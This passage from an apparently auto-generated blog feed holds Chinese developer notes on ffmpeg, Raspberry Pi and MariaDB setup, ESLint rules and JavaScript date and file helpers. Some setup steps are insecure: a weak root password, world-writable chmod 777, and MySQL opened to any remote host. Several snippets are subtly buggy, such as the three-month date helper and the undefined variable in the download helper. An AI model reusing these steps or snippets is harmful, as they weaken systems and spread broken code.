rtmp:/localhost:1935/stream/test# 摄像头推流至rtmp接口（不包含acodec）ffmpeg -f vfwcap  -i &quot;0&quot; -c:v libx264 -preset ultrafast -f flv rtmp://localhost:1935media/home# 桌面desktop推流至rtmp接口（不包含acodec）ffmpeg -f gdigrab -i desktop -vcodec libx264 -preset ultrafast -f flv rtmp://192.168.5251:1935/media/home</code></pre><h3 id="ffmpeg本地"><a href="#ffmpeg本地" class="headerlink" title="ffmpeg本地"></a>ffmpeg本地</h3><pre><code class="shell"># 从视频中提取音频ffmpeg.exe -i aa.mp4 -vn -c:a copy output.aac# -vn 表示去掉视频， -c:a copy表示不改变音频编码，直接拷贝。# 进行指定时间截图ffmpeg.exe -ss 0:8:34 -i aa.mp4 -vframes 1 -q:v 2 output.jpg# -vframes1表示只截取一帧， -q:v2表示输出的图片质量，通常范围在1到5之间（1 为最高质量）# 为音频添加封面ffmpeg -loop 1 -i cover.jpg -i input.mp3 -c:v libx264 -c:a aac -b:a 192k -shortest output.mp4# 以上命令中，有两个输入文件，一个是封面图片 cover.jpg，另一个是音频文件 input.mp3。-loop1参数表示图片无限循环，  -shortest参数表示音频文件结束时，输出视频也随之结束。# MP4 转 M3U8ffmpeg -i input.mp4 -c:v libx264 -c:a aac -strict -2 -f hls -hlslistsize 2 -hls_time 15 output.m3u8# 该命令将 input.mp4 视频文件每15秒生成一个 ts 文件，并最后生成一个 m3u8 文件，m3u8 文件则作为 ts 的索引文件。# 屏幕录制并保存成文件ffmpeg -f gdigrab -i desktop eguid.mp4# 转流（rtsp转rtmp为例）ffmpeg -i rtsp://184.72.239.149/vod/mp4://BigBuckBunny_175k.mov -rtsp_transport tcp -vcodec h264 -acodec aac -f flv rtmp://localhost:1935/rtmp/eguid# 拉流ffmpeg -i rtmp://eguid.cc:1935/rtmp/eguid -vcodec h264 -f flv -acodec aac -ac 2 eguid.flv</code></pre><h2 id="win命令控制"><a href="#win命令控制" class="headerlink" title="win命令控制"></a>win命令控制</h2><pre><code class="shell"># 命令前+start新开命令窗口执行tasklist # 查询所有进程tasklist /fi &quot;imagename eq ffmpeg.exe&quot; # 根据名字查询进程taskkill /f /im ffmpeg.exe # 根据进程名结束进程taskkill /pid 13044 -f # 根据pid值结束进程</code></pre>]]></content>
      
      
      <categories>
          
          <category> Win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ffmpeg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Raspberry pi</title>
      <link href="/2024/03/01/raspberrypi/"/>
      <url>/2024/03/01/raspberrypi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>关于Raspberry 初次使用注意以及基本内容，持续完善中…</p></blockquote><h2 id="系统烧录"><a href="#系统烧录" class="headerlink" title="系统烧录"></a>系统烧录</h2><ol><li>解压下载的系统压缩文件，得到img镜像文件</li><li>将SD使用卡托或者读卡器后，连上电脑</li><li>解压并运行win32diskimager工具（需要先格式化SD卡）</li><li>在软件中选择img（镜像）文件，“Device”下选择SD的盘符，然后选择“Write”<br>然后就开始安装系统了，根据你的SD速度，安装过程有快有慢。</li></ol><p>ps：树莓派官网提供的烧录工具选择更多点 <a href="https://www.raspberrypi.com/software/">https://www.raspberrypi.com/software/</a></p><h2 id="首次开机"><a href="#首次开机" class="headerlink" title="首次开机"></a>首次开机</h2><h3 id="关于账号"><a href="#关于账号" class="headerlink" title="关于账号"></a>关于账号</h3><pre><code class="shell"># 用户名：pi# 密码：yahboom / raspberry# root用户原始系统是没有开启的，自己设置密码就可以sudo passwd root # 输入两次密码确认sudo passwd --unlock root # 解锁root用户# 切换root：su # 确认后输入密码</code></pre><h3 id="进入后界面操作"><a href="#进入后界面操作" class="headerlink" title="进入后界面操作"></a>进入后界面操作</h3><pre><code class="shell"># 打开树莓派系统下的命令行终端（Ctrl+Alt+T）ifconfig # 查看我们的ip地址sudo raspi-config # 进入到树莓派系统配置界面</code></pre><h3 id="关于几个常用命令"><a href="#关于几个常用命令" class="headerlink" title="关于几个常用命令"></a>关于几个常用命令</h3><pre><code class="shell"># 查看操作系统版本cat /proc/version# 查看主板版本cat /proc/cpuinfo# 查看SD存储卡剩余空间df -h# 查看ip地址ifconfig# 压缩tar –zcvf  filename.tar.gz dirname# 解压tar –zxvf filename.tar.gz# Linux更改文件权限（递归子集）chmod -R 777 /home/test</code></pre><h2 id="关机注意"><a href="#关机注意" class="headerlink" title="关机注意"></a>关机注意</h2><pre><code class="shell"># 不能直接拔掉电源，会造成树莓派数据无法及时保存而丢失# 可以按需选择相关的终端命令操作sudo poweroff # 关闭电源sudo shutdown -h now # 立刻关机sudo shutdown -r now # 立刻重启sudo reboot # 重启sudo shutdown -h +2 # 2分钟之后关机</code></pre><h2 id="关于pi安装问题"><a href="#关于pi安装问题" class="headerlink" title="关于pi安装问题"></a>关于pi安装问题</h2><h3 id="apt-get基本命令"><a href="#apt-get基本命令" class="headerlink" title="apt-get基本命令"></a>apt-get基本命令</h3><pre><code class="shell"># apt-get可简写apt# 更新源文件sudo apt-get update# 升级所有已安装的包sudo apt-get upgrade# 清理无用的包sudo apt-get autoclean# 检查是否有损坏的依赖sudo apt-get check# 安装 sudo apt-get install _name_# 移除sudo apt-get remove _name_# 删除包，包括配置文件sudo apt-get remove _name_ --purge# 删除包，包括包及其依赖的软件、配置文件sudo apt-get autoremove _name_ --purge</code></pre><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><pre><code class="shell"># 下面两个源都可使用# deb https://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ buster main contrib non-free rpi# deb https://mirrors.ustc.edu.cn/raspbian/raspbian/ buster main contrib non-free rpisudo nano /etc/apt/sources.list # 进入该配置文件更换源sudo apt update # 配置完成后执行该命令使生效</code></pre><h3 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h3><pre><code class="shell"># 树莓派无法直接安装mysql，建议使用 mariadb-server-10.0 ，用法一致sudo apt-get install mariadb-server-10.0</code></pre><h3 id="解决无密码可登录mysql的问题"><a href="#解决无密码可登录mysql的问题" class="headerlink" title="解决无密码可登录mysql的问题"></a>解决无密码可登录mysql的问题</h3><pre><code class="shell"># 进入mysql后执行SET password for &#39;root&#39;@&#39;localhost&#39;=password(&#39;123456&#39;); # 设置密码UPDATE user SET plugin=&#39;mysql_native_password&#39; WHERE user=&#39;root&#39;; # 修改root用户为校验密码exit;# 退出MySQL执行systemctl restart mysql # 重启mysql，执行后选择账户输入密码即可cd /etc/mysql # 配置文件下的bind-host改为0.0.0.0，允许任意远程登录# mysql内执行create user &#39;example&#39;@&#39;%&#39; identified by &#39;example123&#39;; # 创建用户grant all on example.* to &#39;example&#39;@&#39;%&#39;; # 指定访问数据库flush privileges; # 更新配置信息</code></pre><h3 id="安装node"><a href="#安装node" class="headerlink" title="安装node"></a>安装node</h3><pre><code class="shell"># 下载nvm的包放入/home/pi(也就是~的指向路径)sudo nano ~/.bashrc# 修改.bashrc文件在后面写入以下内容export NVM_DIR=&quot;$HOME/.nvm/nvm-0.38.0&quot;[ -s &quot;$NVM_DIR/nvm.sh&quot; ] &amp;&amp; \. &quot;$NVM_DIR/nvm.sh&quot;  # This loads nvm[ -s &quot;$NVM_DIR/bash_completion&quot; ] &amp;&amp; \. &quot;$NVM_DIR/bash_completion&quot;  # This loads nvm bash_completion# 执行命令更新配置source ~/.bashrcnvm install 16.19.0nvm install 14.21.3</code></pre><h2 id="部署node项目（pm2）"><a href="#部署node项目（pm2）" class="headerlink" title="部署node项目（pm2）"></a>部署node项目（pm2）</h2><pre><code class="shell"># 安装pm2npm install pm2 -g# 查看版本pm2 --version# 启动服务pm2 start app.js# 停止服务pm2 stop app.js# 查看服务状态pm2 monitpm2 list# 同步进程pm2 save</code></pre>]]></content>
      
      
      <categories>
          
          <category> Raspberrypi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 树莓派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Eslint</title>
      <link href="/2024/01/15/frontend-npm-eslint/"/>
      <url>/2024/01/15/frontend-npm-eslint/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前端项目工程依赖Eslint，配置后可对前端项目工程进行代码格式及规范校验和提示，提升项目格式规范。</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装到开发环境"><a href="#安装到开发环境" class="headerlink" title="安装到开发环境"></a>安装到开发环境</h3><pre><code class="bash">npm install -D eslint@2.8.8 eslint-plugin-vue@9.28.0</code></pre><h3 id="依赖包"><a href="#依赖包" class="headerlink" title="依赖包"></a>依赖包</h3><pre><code class="javascript">&#123;    &quot;devDependencies&quot;: &#123;        &quot;eslint&quot;: &quot;^8.57.0&quot;,        &quot;eslint-plugin-vue&quot;: &quot;^9.28.0&quot;    &#125;&#125;</code></pre><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><pre><code class="javascript">&#123;    &quot;scripts&quot;: &#123;        &quot;eslint&quot;: &quot;eslint . --ext .js,.vue&quot;    &#125;,&#125;</code></pre><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><pre><code class="bash">npm run eslint</code></pre><h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><h3 id="配置规则文件"><a href="#配置规则文件" class="headerlink" title="配置规则文件"></a>配置规则文件</h3><ol><li>命令生成文件</li></ol><pre><code class="bash">npx eslint --init</code></pre><ol start="2"><li>配置内容</li></ol><pre><code class="javascript">module.exports = &#123;    env: &#123;        browser: true,        es2021: true    &#125;,    extends: [        &#39;eslint:recommended&#39;,        &#39;plugin:vue/vue3-essential&#39;    ],    overrides: [        &#123;            env: &#123;                node: true            &#125;,            files: [                &#39;.eslintrc.&#123;js,cjs&#125;&#39;            ],            parserOptions: &#123;                sourceType: &#39;script&#39;            &#125;        &#125;    ],    parserOptions: &#123;        ecmaVersion: &#39;latest&#39;,        sourceType: &#39;module&#39;    &#125;,    plugins: [        &#39;vue&#39;    ],    rules: &#123;        &#39;vue/multi-word-component-names&#39;: &#39;off&#39;,        // 这条规则不允许在循环体中使用 await。        &#39;no-await-in-loop&#39;: 2,        //禁止使用alert confirm prompt        &#39;no-alert&#39;: 0,        //禁止使用数组构造器        &#39;no-array-constructor&#39;: 2,        //禁止使用按位运算符        &#39;no-bitwise&#39;: 0,        //禁止使用arguments.caller或arguments.callee        &#39;no-caller&#39;: 2,        //禁止给class赋值        &#39;no-class-assign&#39;: 2,        //禁止在条件表达式中使用赋值语句        &#39;no-cond-assign&#39;: 2,        //禁止修改const声明的变量        &#39;no-const-assign&#39;: 2,        //禁止在条件中使用常量表达式 if (true) if (1)        &#39;no-constant-condition&#39;: 2,        //禁止使用continue        &#39;no-continue&#39;: 0,        //禁止在正则表达式中使用控制字符        &#39;no-control-regex&#39;: 2,        //不能对var声明的变量使用delete操作符        &#39;no-delete-var&#39;: 2,        //不允许将 Math、JSON、Reflect、Atomics 和 Intl 对象作为函数调用  var math = Math();        &#39;no-obj-calls&#39;: 2,        //不允许两边完全相同的赋值  foo = foo;        &#39;no-self-assign&#39;: 2,        //不允许无意义的代码        // var x = 10;        // if (x === x) &#123;x = 20&#125;        &#39;no-self-compare&#39;: 2,        //禁止稀疏数组， [1,,2]        &#39;no-sparse-arrays&#39;: 2,        //在调用super()之前不能使用this或super        &#39;no-this-before-super&#39;: 2,        //不能有未定义的变量        &#39;no-undef&#39;: 2,        //不能有无法执行的代码  因为 return、throw、break 和 continue 语句无条件地退出一个代码块        &#39;no-unreachable&#39;: 2,        //不能有声明后未被使用的变量或参数        &#39;no-unused-vars&#39;: [2, &#123;&#39;vars&#39;: &#39;all&#39;, &#39;args&#39;: &#39;after-used&#39;&#125;],        //未定义前不能使用        &#39;no-use-before-define&#39;: 2,        //禁止比较时使用NaN，只能用isNaN()        &#39;use-isnan&#39;: 2,        //强制驼峰法命名myFavoriteColor 、_myFavoriteColor、MY_FAVORITE_COLOR        &#39;camelcase&#39;: 2,        //return 后面是否允许省略        &#39;consistent-return&#39;: 0,        //必须使用 if ()&#123;&#125; 中的&#123;&#125;        &#39;curly&#39;: [2, &#39;all&#39;],        //switch语句最后必须有default        &#39;default-case&#39;: 1,        //default 必须放在最后        &#39;default-case-last&#39;: 2,        //避免不必要的方括号        &#39;dot-notation&#39;: [0, &#123;&#39;allowKeywords&#39;: true&#125;],        //必须使用全等   === and !==        &#39;eqeqeq&#39;: 2,        //函数表达式必须有名字        &#39;func-names&#39;: 0,        //函数风格，规定只能使用函数声明/函数表达式        &#39;func-style&#39;: [0, &#39;declaration&#39;],        //变量名长度        &#39;id-length&#39;: 0,        //声明时必须赋初值        &#39;init-declarations&#39;: 0,        //代码块的嵌套块深度        &#39;max-depth&#39;: [2, 5],        //强制每个文件的最大行数        &#39;max-lines&#39;: [1, 9999],        //回调嵌套深度        &#39;max-nested-callbacks&#39;: [0, 5],        //函数最多只能有10个参数        &#39;max-params&#39;: [0, 10],        //函数内最多有几个声明        &#39;max-statements&#39;: [0, 10],        //函数名首行大写必须使用new方式调用，首行小写必须用不带new方式调用  var friend = new Person();        &#39;new-cap&#39;: 2,        //不允许在正则表达式的开头显式使用除法运算符     /=foo/        &#39;no-div-regex&#39;: 1,        //如果if语句里面有return,后面不能跟else语句        &#39;no-else-return&#39;: 2,        //块语句中的内容不能为空        &#39;no-empty&#39;: 2,        //禁止对null使用==或!=运算符        &#39;no-eq-null&#39;: 2,        //禁止多余的冒号        &#39;no-extra-semi&#39;: 2,        //小数点之前之后必须要有数字  不能省略0        &#39;no-floating-decimal&#39;: 2,        //禁止隐式转换        &#39;no-implicit-coercion&#39;: 2,        //禁止行内备注        &#39;no-inline-comments&#39;: 0,        //禁止使用__iterator__ 属性        &#39;no-iterator&#39;: 2,        //禁止不必要的嵌套块        &#39;no-lone-blocks&#39;: 2,        //禁止在循环中使用函数（如果没有引用外部变量不形成闭包就可以）        &#39;no-loop-func&#39;: 0,        //禁止链式赋值  var a = b = c = 5;        &#39;no-multi-assign&#39;: 0,        //字符串不能用\换行        &#39;no-multi-str&#39;: 2,        //禁止使用嵌套的三目运算        &#39;no-nested-ternary&#39;: 0,        //禁止在使用new构造一个实例后不赋值        &#39;no-new&#39;: 2,        //禁止使用new Function        &#39;no-new-func&#39;: 2,        //禁止使用new Object()        &#39;no-new-object&#39;: 2,        //禁止使用new创建包装实例，new String new Boolean new Number        &#39;no-new-wrappers&#39;: 2,        //禁止使用八进制数字（零开头的数字）        &#39;no-octal&#39;: 2,        //禁止使用++，--        &#39;no-plusplus&#39;: 0,        //禁止使用__proto__属性        &#39;no-proto&#39;: 2,        //禁止重复声明变量        &#39;no-redeclare&#39;: 2,        //return 语句中不能有赋值表达式  return foo = bar + 2;        &#39;no-return-assign&#39;: 0,        //禁止使用javascript:void(0)        &#39;no-script-url&#39;: 0,        //外部作用域中的变量不能与它所包含的作用域中的变量或参数同名        &#39;no-shadow&#39;: 2,        //严格模式中规定的限制标识符不能作为声明时的变量名使用  NaN、Infinity、undefined        &#39;no-shadow-restricted-names&#39;: 2,        //禁止使用三目运算符        &#39;no-ternary&#39;: 0,        //变量初始化时不能直接给它赋值为undefined        &#39;no-undef-init&#39;: 2,        //标识符不能以_开头或结尾        &#39;no-underscore-dangle&#39;: 0,        //禁止不必要的嵌套 var isYes = answer === 1 ? true : false;        &#39;no-unneeded-ternary&#39;: 1,        //禁用var，用let和const代替        &#39;no-var&#39;: 2,        //禁用with        &#39;no-with&#39;: 2,        //强制对象字面量缩写语法        &#39;object-shorthand&#39;: 0,        //连续声明  var bar; var baz; =&gt; var bar,baz;        &#39;one-var&#39;: 0,        //赋值运算符 += -=什么的        &#39;operator-assignment&#39;: [0, &#39;always&#39;],        //首选const        &#39;prefer-const&#39;: 0,        //对象字面量中的属性必须加上双引号        &#39;quote-props&#39;: 0,        //注释风格要不要有空格什么的        &#39;spaced-comment&#39;: 0,        //使用严格模式        &#39;strict&#39;: 0,        //箭头函数用小括号括起来        &#39;arrow-parens&#39;: 0,        //=&gt;的前/后括号        &#39;arrow-spacing&#39;: 0,        //逗号风格，换行时在行首还是行尾  last 在行尾        &#39;comma-style&#39;: [2, &#39;last&#39;],        //缩进风格  2个tab        &#39;indent&#39;: [2, 4],        //对象字面量中冒号的前后空格        &#39;key-spacing&#39;: [0, &#123;&#39;beforeColon&#39;: false, &#39;afterColon&#39;: true&#125;],        //new时必须加小括号        &#39;new-parens&#39;: 2,        //禁止非必要的括号        &#39;no-extra-parens&#39;: 1,        //空行最多不能超过3行        &#39;no-multiple-empty-lines&#39;: [1, &#123;&#39;max&#39;: 3&#125;],        //一行结束后面不要有空格        &#39;no-trailing-spaces&#39;: 1,        //换行时运算符在行尾还是行首        // foo = 1 +        //       2;        &#39;operator-linebreak&#39;: [1, &#39;after&#39;],        //块语句内行首行尾是否要空行        &#39;padded-blocks&#39;: 0,        //引号类型 `` &#39;&#39; &#39;&#39;        &#39;quotes&#39;: [1, &#39;single&#39;],        //语句强制分号结尾        &#39;semi&#39;: [0, &#39;always&#39;],        //分号前后空格        &#39;semi-spacing&#39;: [0, &#123;&#39;before&#39;: false, &#39;after&#39;: true&#125;],        //函数定义时括号前面要不要有空格        &#39;space-before-function-paren&#39;: [0, &#39;always&#39;],        //中缀操作符周围要不要有空格   a + b        &#39;space-infix-ops&#39;: 0,        //正则表达式字面量用小括号包起来        &#39;wrap-regex&#39;: 0,    &#125;&#125;</code></pre><h3 id="忽略规则文件"><a href="#忽略规则文件" class="headerlink" title="忽略规则文件"></a>忽略规则文件</h3><pre><code>build/*.jsnode_modulespublicsrc/config/*distvite.config.js</code></pre>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Eslint </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dev-Memos</title>
      <link href="/2024/01/01/frontend-devmemos/"/>
      <url>/2024/01/01/frontend-devmemos/</url>
      
        <content type="html"><![CDATA[<blockquote><p>一些代码片段记录，持续更新…</p></blockquote><h2 id="时间内容"><a href="#时间内容" class="headerlink" title="时间内容"></a>时间内容</h2><h3 id="时分秒倒计时（09-59-20）"><a href="#时分秒倒计时（09-59-20）" class="headerlink" title="时分秒倒计时（09:59:20）"></a>时分秒倒计时（09:59:20）</h3><pre><code class="javascript">// timeStamp为毫秒handleToSetTimerFn(timeStamp) &#123;    let timer = null    let t = timeStamp    let h = 0    let m = 0    let s = 0    h = Math.floor(t / (60 * 60))    h &lt; 10 &amp;&amp; (h = &#39;0&#39; + h)    m = Math.floor(t / 60 % 60)    m &lt; 10 &amp;&amp; (m = &#39;0&#39; + m)    s = Math.floor(t % 60)    let _thisTemp = this    timer = setInterval(() =&gt; &#123;        s--        s &lt; 10 &amp;&amp; (s = &#39;0&#39; + s)        if (s.length &gt;= 3) &#123;            s = 59            m = (Number(m) - 1)            m &lt; 10 &amp;&amp; (m = &#39;0&#39; + m)        &#125;        if (m.length &gt;= 3) &#123;            m = 59            h = (Number(h) - 1)            h &lt; 10 &amp;&amp; (h = &#39;0&#39; + h)        &#125;        if (h.length &gt;= 3) &#123;            h = &#39;00&#39;            m = &#39;00&#39;            s = &#39;00&#39;            clearInterval(timer)        &#125;        _thisTemp.timerStr = (h + &#39;:&#39; + m + &#39;:&#39; + s)    &#125;, 1000)&#125;</code></pre><h3 id="秒转换时分秒（10-00-00）"><a href="#秒转换时分秒（10-00-00）" class="headerlink" title="秒转换时分秒（10:00:00）"></a>秒转换时分秒（10:00:00）</h3><pre><code class="javascript">handleformatSeconds(value) &#123;    if(!value) &#123;        return 0    &#125;    let second = parseInt(value)    let minute = 0    let hour = 0    if (second &gt; 60) &#123;        minute = parseInt(second / 60)        second = parseInt(second % 60)        if (minute &gt; 60) &#123;            hour = parseInt(minute / 60)            minute = parseInt(minute % 60)        &#125;    &#125;    const result = (parseInt(hour) &gt;= 10 ? parseInt(hour) : &#39;0&#39; + parseInt(hour)) + &#39;:&#39; + (parseInt(minute) &gt;= 10 ? parseInt(minute) : &#39;0&#39; + parseInt(minute)) +&#39;:&#39;+ (parseInt(second) &gt;= 10 ? parseInt(second) : &#39;0&#39; + parseInt(second))    return result&#125;</code></pre><h3 id="时间范围与当前时间对比"><a href="#时间范围与当前时间对比" class="headerlink" title="时间范围与当前时间对比"></a>时间范围与当前时间对比</h3><pre><code class="javascript">_handleToCompareTime(tempStartTimeStr, tempEndTimeStr) &#123;    const tempStartTime = new Date(tempStartTimeStr).getTime()    const tempEndTime = new Date(tempEndTimeStr).getTime()    const thisTempTime = new Date().getTime()    if (thisTempTime &lt; tempStartTime) &#123;        console.log(Math.round((tempStartTime - thisTempTime) / 1000 / 60)) // 距离开始剩余时间（minute）        return -1 // 范围前    &#125; else if (thisTempTime &gt; tempStartTime &amp;&amp; thisTempTime &lt; tempEndTime) &#123;        console.log(Math.round((tempEndTime - thisTempTime) / 1000 / 60)) // 距离结束剩余时间（minute）        return 0 // 范围中    &#125; else &#123;        return 1 // 范围后    &#125;&#125;</code></pre><h3 id="对比输入日期与当前日期"><a href="#对比输入日期与当前日期" class="headerlink" title="对比输入日期与当前日期"></a>对比输入日期与当前日期</h3><pre><code class="javascript">_handleToCompareTime(dateString) &#123;    if (!dateString) &#123;        return false    &#125;    const currentDate = new Date() // 获取当前日期    const inputDate = new Date(dateString) // 将输入的日期字符串转换为Date对象    if (inputDate &gt; currentDate) &#123;        return false // 如果输入的日期大于当前日期    &#125;    return true // 输入日期小于或等于当前日期&#125;_handleToCompareTime(&#39;2024-05-01&#39;)</code></pre><h3 id="时间格式化"><a href="#时间格式化" class="headerlink" title="时间格式化"></a>时间格式化</h3><pre><code class="javascript">dateFormat(date, format) &#123;    const zeroPadding = (i) =&gt; &#123;        return (i &lt; 10 ? &#39;0&#39; : &#39;&#39;) + i    &#125;    return format.replace(/yyyy|MM|dd|HH|mm|ss/g, function (item) &#123;        switch (item) &#123;            case &#39;yyyy&#39;:                return zeroPadding(date.getFullYear())            case &#39;MM&#39;:                return zeroPadding(date.getMonth() + 1)            case &#39;dd&#39;:                return zeroPadding(date.getDate())            case &#39;HH&#39;:                return zeroPadding(date.getHours())            case &#39;mm&#39;:                return zeroPadding(date.getMinutes())            case &#39;ss&#39;:                return zeroPadding(date.getSeconds())        &#125;    &#125;)&#125;dateFormat(new Date(), &#39;yyyy-MM-dd HH:mm:ss&#39;)</code></pre><h3 id="时间格式化-一年前的时间"><a href="#时间格式化-一年前的时间" class="headerlink" title="时间格式化 一年前的时间"></a>时间格式化 一年前的时间</h3><pre><code class="javascript">oldDateFormat(date, format) &#123;    const zeroPadding = (i) =&gt; &#123;        return (i &lt; 10 ? &#39;0&#39; : &#39;&#39;) + i    &#125;    date.setFullYear(date.getFullYear() - 1)    return format.replace(/yyyy|MM|dd|HH|mm|ss/g, function (item) &#123;        switch (item) &#123;            case &#39;yyyy&#39;:                return zeroPadding(date.getFullYear())            case &#39;MM&#39;:                return zeroPadding(date.getMonth() + 1)            case &#39;dd&#39;:                return zeroPadding(date.getDate())            case &#39;HH&#39;:                return zeroPadding(date.getHours())            case &#39;mm&#39;:                return zeroPadding(date.getMinutes())            case &#39;ss&#39;:                return zeroPadding(date.getSeconds())        &#125;    &#125;)&#125;oldDateFormat(new Date(), &#39;yyyy-MM-dd HH:mm:ss&#39;)</code></pre><h3 id="3个月前的时间"><a href="#3个月前的时间" class="headerlink" title="3个月前的时间"></a>3个月前的时间</h3><pre><code class="javascript">export const getDateBefore3MonthFn = (tempDate) =&gt; &#123;    const beforeDateNum = tempDate.getDate()    tempDate.setMonth(tempDate.getDate() - 3)    const afterDateNum = tempDate.getDate()    if (beforeDateNum !== afterDateNum) &#123;        tempDate.setDate(0)    &#125;    tempDate.setDate(Number(tempDate.getDate()) + 1)    return tempDate&#125;</code></pre><h3 id="ElementUi日期组件"><a href="#ElementUi日期组件" class="headerlink" title="ElementUi日期组件"></a>ElementUi日期组件</h3><pre><code class="javascript">    // ElementUi组件禁用当前时间前2天后5天以外的内容    disabledDate: (date) =&gt; &#123;        return date.getTime() &lt; Date.now() - 2 * 24 * 60 * 60 * 1000 || date.getTime() &gt; Date.now() + 5 * 24 * 60 * 60 * 1000    &#125;</code></pre><h2 id="文件内容"><a href="#文件内容" class="headerlink" title="文件内容"></a>文件内容</h2><h3 id="文件流下载"><a href="#文件流下载" class="headerlink" title="文件流下载"></a>文件流下载</h3><pre><code class="javascript">handleReturnDownloadFile(content,filename) &#123;    let eleLink = document.createElement(&#39;a&#39;)    eleLink.download = filename    eleLink.style.display = &#39;none&#39;    // 字符内容转变成blob地址     let url= window.URL.createObjectURL(new Blob([data], &#123; type: &#39;application/octet-stream&#39; &#125;))    eleLink.href = url     // 自动触发点击     document.body.appendChild(eleLink)    eleLink.click()    // 然后移除     document.body.removeChild(eleLink)    //释放    window.URL.revokeObjectURL(url)&#125;</code></pre><h3 id="Base64转img"><a href="#Base64转img" class="headerlink" title="Base64转img"></a>Base64转img</h3><pre><code class="javascript">convertBase64UrlToBlob(urlData) &#123;    let bytes = window.atob(urlData)    // 处理异常,将ascii码小于0的转换为大于0    let ab = new ArrayBuffer(bytes.length)    let ia = new Uint8Array(ab)    for (let i = 0; i &lt; bytes.length; i++) &#123;        ia[i] = bytes.charCodeAt(i)    &#125;    return new Blob([ab], &#123;type: &#39;image/jpg&#39;&#125;)&#125;</code></pre><h3 id="img转Base64"><a href="#img转Base64" class="headerlink" title="img转Base64"></a>img转Base64</h3><pre><code class="javascript">convertBlobToBase64Url(file) &#123;    return new Promise((resolve, reject) =&gt; &#123;        let image = new Image()        image.src = URL.createObjectURL(file)        image.onload = () =&gt; &#123;            let canvas = document.createElement(&#39;canvas&#39;)            let content = canvas.getContext(&#39;2d&#39;)            canvas.width = image.width            canvas.height = image.height            content.drawImage(image, 0, 0, canvas.width, canvas.height)            resolve(canvas.toDataURL(file.type))            canvas.width = canvas.height = 0            content.fillRect(0, 0, 0, 0)            canvas = null            content = null            image = null        &#125;        image.onerror = (event, source, lineno, colno, error) =&gt; &#123;            if (error) &#123;                console.error(event, source, lineno, colno, error)                reject(error)                image = null            &#125;        &#125;    &#125;)&#125;</code></pre><h3 id="获取图片"><a href="#获取图片" class="headerlink" title="获取图片"></a>获取图片</h3><pre><code class="javascript">export const chooseImage = (option) =&gt; &#123;    try &#123;        const imageInput = document.createElement(&#39;input&#39;)        imageInput.type = &#39;file&#39;        imageInput.accept = &#39;image/*&#39;        if (option.sourceType === &#39;camera&#39;) &#123;            imageInput.capture = &#39;environment&#39;        &#125;        imageInput.style.height = &#39;0px&#39;        imageInput.style.width = &#39;0px&#39;        imageInput.style.position = &#39;fixed&#39;        imageInput.style.left = &#39;0px&#39;        imageInput.style.top = &#39;0px&#39;        imageInput.style.visibility = &#39;hidden&#39;        document.getElementsByTagName(&#39;body&#39;)[0].appendChild(imageInput)        imageInput.onchange = async function (e) &#123;            if (e.target.files.length) &#123;                let image = e.target.files[0]                let gifFlag = image.type.includes(&#39;gif&#39;)                // 设置了压缩但是图片为gif图片打印错误提示                if (option.compress &amp;&amp; gifFlag) &#123;                    console.log(&#39;\n&#39;)                    console.warn(&#39;前端不具备压缩gif动图的能力，请服务端处理&#39;);                    console.log(&#39;\n&#39;)                &#125;                // 不是gif图片 设置了压缩 并且 大于1.8M才会触发压缩                const compress = !gifFlag &amp;&amp; option.compress &amp;&amp; image.size &gt; 1572864                // 达到压缩条件开始压缩                if (compress) &#123;                    // 大于1.8M才会触发压缩                    image = await compressImageHandler(image)                &#125;                const result = &#123;                    file: image,                    name: image.name,                    size: image.size,                    path: !compress || gifFlag ? URL.createObjectURL(image) : await imageToBase64Handler(image),                    type: image.type,                &#125;                typeof option.success === &#39;function&#39; &amp;&amp; option.success(result)                typeof option.complete === &#39;function&#39; &amp;&amp; option.complete(result)                imageInput.remove()            &#125;        &#125;        imageInput.click()    &#125; catch (e) &#123;        typeof option.fail === &#39;function&#39; &amp;&amp; option.fail(e)        typeof option.complete === &#39;function&#39; &amp;&amp; option.complete(e)    &#125;&#125;chooseImage(&#123;  success: (data) =&gt; &#123;&#125;&#125;)</code></pre><h3 id="选取视频"><a href="#选取视频" class="headerlink" title="选取视频"></a>选取视频</h3><pre><code class="javascript">export function chooseVideo(option = &#123;&#125;) &#123;    try &#123;        const fileInput = document.createElement(&#39;input&#39;)        fileInput.type = &#39;file&#39;        fileInput.accept = &#39;video/*&#39;        if (option.sourceType === &#39;camera&#39;) &#123;            fileInput.capture = option.camera ? (option.camera === &#39;front&#39; ? &#39;user&#39; : &#39;environment&#39;) : &#39;user&#39;        &#125;        fileInput.style.height = &#39;0px&#39;        fileInput.style.width = &#39;0px&#39;        fileInput.style.position = &#39;fixed&#39;        fileInput.style.left = &#39;0px&#39;        fileInput.style.top = &#39;0px&#39;        fileInput.style.visibility = &#39;hidden&#39;        document.getElementsByTagName(&#39;body&#39;)[0].appendChild(fileInput)        fileInput.onchange = function (e) &#123;            if (e.target.files.length) &#123;                const file = e.target.files[0]                const result = &#123;                    file,                    name: file.name,                    size: file.size,                    path: URL.createObjectURL(file),                    type: file.type,                &#125;                typeof option.success === &#39;function&#39; &amp;&amp; option.success(result)                typeof option.complete === &#39;function&#39; &amp;&amp; option.complete(result)                fileInput.remove()            &#125;        &#125;        fileInput.click()    &#125; catch (e) &#123;        typeof option.fail === &#39;function&#39; &amp;&amp; option.fail(e)        typeof option.complete === &#39;function&#39; &amp;&amp; option.complete(e)    &#125;&#125;chooseVideo(&#123;  success: (data) =&gt; &#123;&#125;&#125;)</code></pre><h2 id="字符串内容"><a href="#字符串内容" 